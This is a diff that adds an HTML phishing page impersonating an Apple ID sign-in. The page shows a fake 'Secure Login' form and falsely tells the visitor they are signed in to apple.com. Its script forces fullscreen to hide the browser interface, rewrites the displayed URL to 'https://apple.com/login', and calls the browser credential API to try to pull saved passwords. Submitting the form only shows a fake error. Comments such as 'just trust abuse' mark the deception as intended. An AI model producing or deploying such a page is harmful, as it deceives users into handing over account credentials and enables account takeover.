@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html, body {
+      margin: 0; padding: 0;
+      background: white;
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    .center {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    input, button {
+      font-size: 16px;
+      padding: 12px;
+      margin: 10px;
+      width: 80%;
+      max-width: 320px;
+    }
+    .small {
+      font-size: 14px;
+      color: gray;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="center" id="screen">
+  <h2>🔒 Secure Login</h2>
+  <input type="text" placeholder="Apple ID or Email" />
+  <input type="password" placeholder="Password" />
+  <button onclick="submitFake()">Continue</button>
+  <div class="small">You're securely signed in to <b>apple.com</b></div>
+</div>
+
+<script>
+function fakeAddressBar() {
+  history.replaceState({}, "", "https://apple.com/login");
+}
+
+function forceFullscreen() {
+  document.documentElement.requestFullscreen().then(() => {
+    // Suppress UI — no alert(), just trust abuse
+    fakeAddressBar();
+
+    // Optional: fingerprint + timing based tricks
+    setTimeout(() => {
+      navigator.credentials.get?.({
+        password: true,
+        mediation: "optional"
+      }).catch(() => {});
+    }, 800);
+  });
+}
+
+function submitFake() {
+  alert("Error: Something went wrong. Try again."); // Optional distraction
+}
+
+forceFullscreen();
+</script>
+
+</body>
+</html>
